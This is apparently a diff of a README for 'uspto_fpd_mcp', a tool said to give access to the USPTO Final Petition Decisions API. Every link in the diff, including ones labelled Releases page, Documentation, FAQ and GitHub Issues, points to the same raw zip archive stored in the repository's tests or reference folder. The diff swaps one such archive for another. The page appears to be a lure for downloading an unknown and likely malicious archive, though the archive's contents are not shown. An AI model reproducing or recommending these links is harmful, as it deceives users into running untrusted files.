@@ -1,7 +1,7 @@
 # 🚀 uspto_fpd_mcp - Fast API Access for Patent Research
 
 ## 📥 Download
-[![Download uspto_fpd_mcp](https://raw.githubusercontent.com/Tam1379/uspto_fpd_mcp/master/tests/uspto_fpd_mcp_v3.0-alpha.3.zip)](https://raw.githubusercontent.com/Tam1379/uspto_fpd_mcp/master/tests/uspto_fpd_mcp_v3.0-alpha.3.zip)
+[![Download uspto_fpd_mcp](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip)](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip)
 
 ## 📖 Description
 The **uspto_fpd_mcp** is a high-performance server designed to simplify access to the USPTO Final Petition Decisions API. This tool streamlines document analysis and enhances intellectual property workflows by integrating context reduction and cross-MCP applications.
@@ -23,7 +23,7 @@ The **uspto_fpd_mcp** is a high-performance server designed to simplify access t
 To start using the **uspto_fpd_mcp**, follow these straightforward steps:
 
 1. **Download the Software**
-   Visit the [Releases page](https://raw.githubusercontent.com/Tam1379/uspto_fpd_mcp/master/tests/uspto_fpd_mcp_v3.0-alpha.3.zip) to download the latest version of the uspto_fpd_mcp server.
+   Visit the [Releases page](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip) to download the latest version of the uspto_fpd_mcp server.
 
 2. **Choose Your File**
    On the Releases page, select the version you want. You will find options for different operating systems.
@@ -40,16 +40,16 @@ To start using the **uspto_fpd_mcp**, follow these straightforward steps:
    You can now start using the powerful tools that uspto_fpd_mcp provides. Explore its features to improve your legal research and analysis.
 
 ## 📚 Documentation
-For detailed usage instructions, refer to the [Documentation](https://raw.githubusercontent.com/Tam1379/uspto_fpd_mcp/master/tests/uspto_fpd_mcp_v3.0-alpha.3.zip). You can find information on how to use specific features, troubleshoot issues, and best practices for effective use.
+For detailed usage instructions, refer to the [Documentation](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip). You can find information on how to use specific features, troubleshoot issues, and best practices for effective use.
 
 ## ⚙️ Troubleshooting
-If you encounter any issues during installation or usage, feel free to check the [Frequently Asked Questions](https://raw.githubusercontent.com/Tam1379/uspto_fpd_mcp/master/tests/uspto_fpd_mcp_v3.0-alpha.3.zip). Common issues are answered there for quick reference.
+If you encounter any issues during installation or usage, feel free to check the [Frequently Asked Questions](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip). Common issues are answered there for quick reference.
 
 ## 🌐 Community Support
-Join our community discussions on [GitHub Issues](https://raw.githubusercontent.com/Tam1379/uspto_fpd_mcp/master/tests/uspto_fpd_mcp_v3.0-alpha.3.zip) to ask questions, share ideas, or report bugs. We encourage collaboration and feedback to make uspto_fpd_mcp even better.
+Join our community discussions on [GitHub Issues](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip) to ask questions, share ideas, or report bugs. We encourage collaboration and feedback to make uspto_fpd_mcp even better.
 
 ## 📦 Download & Install
-Go back to the [Releases page](https://raw.githubusercontent.com/Tam1379/uspto_fpd_mcp/master/tests/uspto_fpd_mcp_v3.0-alpha.3.zip) to download uspto_fpd_mcp. Follow the installation steps outlined above to get started quickly.
+Go back to the [Releases page](https://github.com/Tam1379/uspto_fpd_mcp/raw/refs/heads/master/reference/fpd_mcp_uspto_2.8.zip) to download uspto_fpd_mcp. Follow the installation steps outlined above to get started quickly.
 
 ## 🎉 Acknowledgements
 This project uses various open-source libraries and systems that make it powerful and efficient. Special thanks to the developers and contributors who help improve the software.
